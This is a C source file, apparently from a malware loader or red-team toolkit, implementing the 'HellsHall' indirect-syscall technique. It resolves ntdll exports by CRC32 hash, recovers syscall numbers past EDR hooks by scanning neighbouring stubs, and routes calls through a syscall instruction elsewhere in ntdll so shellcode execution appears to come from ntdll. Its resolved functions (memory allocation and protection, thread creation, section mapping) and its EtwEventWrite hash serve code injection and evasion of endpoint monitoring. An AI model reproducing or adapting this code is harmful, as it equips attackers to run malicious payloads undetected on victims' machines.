#include "Structs.h"
#include "ApiHashing.hpp"
#include "FunctionHashes.h"
#include "HellsHall.h"


#if SYSCALLDEBUG
#include <stdio.h>
#endif //DEBUG


//initialize the NTLL structure for reuse so we can quickly grab function addresses from ntdll.
BOOL InitNtdllConfigStructure(PNTDLL_CONFIG pNtdllConf) {

#if SYSCALLDEBUG
    DWORD hash = crc32b((char*)"NtOpenProcess");
    printf("NtOpneProcess hash = [0x%0.8X]\n", hash);
    hash = crc32b((char*)"NtAllocateVirtualMemory");
    printf("NtAllocateVirtualMemory hash = [0x%08X]\n", hash);
    hash = crc32b((char*)"NtProtectVirtualMemory");
    printf("NtProtectVirtualMemory hash = [0x%08X]\n", hash);
    hash = crc32b((char*)"NtQueryVirtualMemory");
    printf("NtQueryVirtualMemory hash = [0x%08X]\n", hash);
    hash = crc32b((char*)"NtMapViewOfSection");
    printf("NtMapViewOfSection hash = [0x%08X]\n", hash);
    hash = crc32b((char*)"NtCreateSection");
    printf("NtCreateSection hash = [0x%08X]\n", hash);
    hash = crc32b((char*)"NtReadFile");
    printf("NtReadFile hash = [0x%08X]\n", hash);
    hash = crc32b((char*)"NtOpenFile");
    printf("NtOpenFile hash = [0x%08X]\n", hash);
    hash = crc32b((char*)"NtCreateFile");
    printf("NtCreateFile hash = [0x%08X]\n", hash);
    hash = crc32b((char*)"NtCreateThreadEx");
    printf("NtCreateThreadEx hash = [0x%08X]\n", hash);
    hash = crc32b((char*)"NtWaitForSingleObject");
    printf("NtWaitForSingleObject hash = [0x%08X]\n", hash);
    hash = crc32b((char*)"NtOpenSection");
    printf("NtOpenSection hash = [0x%08X]\n", hash);
    hash = crc32b((char*)"NtUnmapViewOfSection");
    printf("#define NtUnmapViewOfSectionCRC [0x%08X]\n", hash);
    hash = crc32b((char*)"EtwEventWrite");
    printf("#define EtwEventWriteCRC 0x%08X\n", hash);
    hash = crc32b((char*)"NtQuerySystemInformation");
    printf("#define NtQuerySystemInformationCRC 0x%08X\n", hash);
    hash = crc32b((char*)"NtCreateThreadEx");
    printf("#define NtCreateThreadExCRC 0x%08X\n", hash);

#endif //debug

    // getting peb 
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    if (!pPeb || pPeb->OSMajorVersion != 0xA)
        return FALSE;

    // getting ntdll.dll module (skipping our local image element)
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

    // getting ntdll's base address
    ULONG_PTR uModule = (ULONG_PTR)(pLdr->DllBase);
    if (!uModule)
        return FALSE;

    // fetching the dos header of ntdll
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)uModule;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    // fetching the nt headers of ntdll
    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(uModule + pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    // fetching the export directory of ntdll
    PIMAGE_EXPORT_DIRECTORY pImgExpDir = (PIMAGE_EXPORT_DIRECTORY)(uModule + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    if (!pImgExpDir)
        return FALSE;

    // initalizing the 'g_NtdllConf' structure's element
    pNtdllConf->uModule = uModule;
    pNtdllConf->dwNumberOfNames = pImgExpDir->NumberOfNames;
    pNtdllConf->pdwArrayOfNames = (PDWORD)(uModule + pImgExpDir->AddressOfNames);
    pNtdllConf->pdwArrayOfAddresses = (PDWORD)(uModule + pImgExpDir->AddressOfFunctions);
    pNtdllConf->pwArrayOfOrdinals = (PWORD)(uModule + pImgExpDir->AddressOfNameOrdinals);

    // checking
    if (!pNtdllConf->uModule || !pNtdllConf->dwNumberOfNames || !pNtdllConf->pdwArrayOfNames || !pNtdllConf->pdwArrayOfAddresses || !pNtdllConf->pwArrayOfOrdinals)
        return FALSE;
    else
        return TRUE;
}


//initialize our syscall table by calling FetchNtSyscall.
BOOL InitNTSysCallsTable(IN OUT PNTAPI_FUNC_TABLE pSyscallTable, IN PNTDLL_CONFIG pNtdllConf)
{
    if (!FetchNtSyscall(NtAllocateVirtualCRC, pNtdllConf, &pSyscallTable->NtAllocateVirtualMemory))
        return FALSE;
    if (!FetchNtSyscall(NtProtectVirtualMemoryCRC, pNtdllConf, &pSyscallTable->NtProtectVirtualMemory))
        return FALSE;
    if (!FetchNtSyscall(NtCreateThreadExCRC, pNtdllConf, &pSyscallTable->NtCreateThreadEx))
        return FALSE;
    if (!FetchNtSyscall(NtWaitForSingleObjectCRC, pNtdllConf, &pSyscallTable->NtWaitForSingleObject))
        return FALSE;
    if (!FetchNtSyscall(NtOpenSectionCRC, pNtdllConf, &pSyscallTable->NtOpenSection))
        return FALSE;
    if (!FetchNtSyscall(NtMapViewOfSectionCRC, pNtdllConf, &pSyscallTable->NtMapViewOfSection))
        return FALSE;
    if (!FetchNtSyscall(NtUnmapViewOfSectionCRC, pNtdllConf, &pSyscallTable->NtUnmapViewOfSection))
        return FALSE;

    return TRUE;
}

// Function does most of the heavy lifting for indirect syscalls.
// is a combination of hells-gate + taurtarous gate + jumps to random syscall location in ntdll before executing system call.
// this makes it so even if we choose a system function that is not hooked, it will calculate the systemcall from neighboring systemcalls.
// then it will also appear to have executed from ntdll instead of our random shellcode location.
BOOL FetchNtSyscall(IN DWORD dwSysHash, IN PNTDLL_CONFIG pNtdllConf, OUT PNT_SYSCALL pNtSys) {

    // initialize ntdll config if not found
    if (!pNtdllConf->uModule) {
        if (!InitNtdllConfigStructure(pNtdllConf))
            return FALSE;
    }

    if (dwSysHash != NULL)
        pNtSys->dwSyscallHash = dwSysHash;
    else
        return FALSE;

    for (size_t i = 0; i < pNtdllConf->dwNumberOfNames; i++) {

        PCHAR pcFuncName = (PCHAR)(pNtdllConf->uModule + pNtdllConf->pdwArrayOfNames[i]);
        PVOID pFuncAddress = (PVOID)(pNtdllConf->uModule + pNtdllConf->pdwArrayOfAddresses[pNtdllConf->pwArrayOfOrdinals[i]]);

        //\
        printf("- pcFuncName : %s - 0x%0.8X\n", pcFuncName, crc32b(pcFuncName));

        // if syscall found
        if (RTIME_crc32b(pcFuncName) == dwSysHash) {

            pNtSys->pSyscallAddress = pFuncAddress;

            if (*((PBYTE)pFuncAddress) == 0x4C
                && *((PBYTE)pFuncAddress + 1) == 0x8B
                && *((PBYTE)pFuncAddress + 2) == 0xD1
                && *((PBYTE)pFuncAddress + 3) == 0xB8
                && *((PBYTE)pFuncAddress + 6) == 0x00
                && *((PBYTE)pFuncAddress + 7) == 0x00) {

                BYTE high = *((PBYTE)pFuncAddress + 5);
                BYTE low = *((PBYTE)pFuncAddress + 4);
                pNtSys->dwSSn = (high << 8) | low;
                break; // break for-loop [i]
            }

            // if hooked - scenario 1
            if (*((PBYTE)pFuncAddress) == 0xE9) {

                for (WORD idx = 1; idx <= RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys->dwSSn = (high << 8) | low - idx;
                        break; // break for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys->dwSSn = (high << 8) | low + idx;
                        break; // break for-loop [idx]
                    }
                }
            }

            // if hooked - scenario 2
            if (*((PBYTE)pFuncAddress + 3) == 0xE9) {

                for (WORD idx = 1; idx <= RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys->dwSSn = (high << 8) | low - idx;
                        break; // break for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys->dwSSn = (high << 8) | low + idx;
                        break; // break for-loop [idx]
                    }
                }
            }

            break; // break for-loop [i]
        }

    }

    if (!pNtSys->pSyscallAddress)
        return FALSE;

    // looking somewhere random
    ULONG_PTR uFuncAddress = (ULONG_PTR)pNtSys->pSyscallAddress + 0xFF;

    // getting the 'syscall' instruction of another syscall function
    for (DWORD z = 0, x = 1; z <= RANGE; z++, x++) {
        if (*((PBYTE)uFuncAddress + z) == 0x0F && *((PBYTE)uFuncAddress + x) == 0x05) {
            pNtSys->pSyscallInstAddress = (PVOID)((ULONG_PTR)uFuncAddress + z);
            break; // break for-loop [x & z]
        }
    }


    if (pNtSys->dwSSn != NULL && pNtSys->pSyscallAddress != NULL && pNtSys->dwSyscallHash != NULL && pNtSys->pSyscallInstAddress != NULL)
        return TRUE;
    else
        return FALSE;

}